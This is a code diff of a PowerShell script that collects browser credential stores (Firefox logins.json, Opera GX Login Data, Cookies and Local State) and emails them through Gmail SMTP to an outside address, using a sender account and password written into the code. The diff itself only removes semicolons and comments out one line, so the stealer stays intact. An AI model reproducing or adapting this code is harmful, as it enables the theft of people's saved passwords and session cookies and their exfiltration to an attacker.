@@ -13,12 +13,12 @@ $lst = @{0=(($env:APPDATA+"\Mozilla\Firefox\Profiles\*"), "firefox", "logins.jso
         4=(($env:APPDATA+"\Opera Software\Opera GX Stable111111\"), "Opera5656", "Login Data", "Cookies", "Local State")}
 ###########
 for ($i=0; $i -lt 5; $i++){
-  $SMTPServer="smtp.gmail.com";
-  $SMTPInfo=New-Object Net.Mail.SmtpClient($SmtpServer,587);
+  $SMTPServer="smtp.gmail.com"
+  $SMTPInfo=New-Object Net.Mail.SmtpClient($SmtpServer,587)
   $SMTPInfo.EnableSsl=$true
-  $SMTPInfo.Credentials=New-Object System.Net.NetworkCredential("f7swwq@gmail.com","parampam1");
+  $SMTPInfo.Credentials=New-Object System.Net.NetworkCredential("f7swwq@gmail.com","parampam1")
   $ReportEmail=New-Object System.Net.Mail.MailMessage
-  $ReportEmail.From="f7swwq@gmail.com";
+  $ReportEmail.From="f7swwq@gmail.com"
   $ReportEmail.To.Add("keklol2045@gmail.com")
   if(Test-Path -Path $lst[$i][0]){
     echo '+++++++++'
@@ -44,7 +44,7 @@ for ($i=0; $i -lt 5; $i++){
   }
   else{
     echo ($lst[$i][1]) #$e=$e+' '+$lst[$i][1]#     
-    $ReportEmail.Subject=("Error: ", $lst[$i][1])
+#     $ReportEmail.Subject=("Error: ", $lst[$i][1])
   }
 }
 
